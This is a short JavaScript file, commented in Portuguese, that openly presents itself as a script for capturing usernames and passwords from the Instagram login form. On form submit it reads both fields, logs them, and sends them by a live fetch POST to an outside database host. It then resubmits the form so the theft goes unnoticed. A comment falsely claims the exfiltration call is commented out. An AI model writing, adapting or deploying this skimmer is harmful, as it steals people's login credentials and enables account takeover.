// Script para capturar nome de usuário e senha do formulário de login do Instagram
document.addEventListener('DOMContentLoaded', () => {
    // Encontra o formulário de login do Instagram (baseado em seletores comuns)
    const loginForm = document.querySelector('form');
    
    if (loginForm) {
        loginForm.addEventListener('submit', (event) => {
            // Impede o comportamento padrão apenas para demonstração (remova isso em um ambiente real)
            event.preventDefault();
            
            // Captura os campos de nome de usuário e senha
            const usernameField = document.querySelector('input[name="username"]');
            const passwordField = document.querySelector('input[name="password"]');
            
            const username = usernameField ? usernameField.value : '';
            const password = passwordField ? passwordField.value : '';
            
            // Exibe as credenciais capturadas (para demonstração)
            console.log('Nome de usuário:', username);
            console.log('Senha:', password);
            
            // Opcional: Enviar as credenciais para um servidor remoto (exemplo comentado para evitar uso indevido)
            
            fetch('https://data-base-apkstorex-443f7/database/data-base-apkstorex-443f7-default-rtdb/data/~2F?hl=pt-BR', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: username,
                    password: password
                })
            })
            .then(response => console.log('Credenciais enviadas'))
            .catch(error => console.error('Erro ao enviar:', error));
            
            
            // Permite o envio do formulário após capturar os dados (remova event.preventDefault() acima para envio real)
            loginForm.submit();
        });
    } else {
        console.log('Formulário de login não encontrado.');
    }
});
